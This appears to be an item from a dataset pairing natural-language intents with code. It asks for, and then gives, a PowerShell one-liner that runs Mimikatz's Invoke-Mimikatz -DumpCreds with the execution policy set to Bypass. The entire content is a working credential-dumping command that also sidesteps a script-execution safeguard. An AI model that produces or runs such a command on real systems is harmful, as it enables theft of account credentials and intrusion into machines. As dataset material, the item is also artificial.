# Natural language intent:
# Define a script containing Mimikatz command and execute it using PowerShell with Bypass execution policy.

$script = "Invoke-Mimikatz -DumpCreds"; powershell.exe -ExecutionPolicy Bypass -Command $script
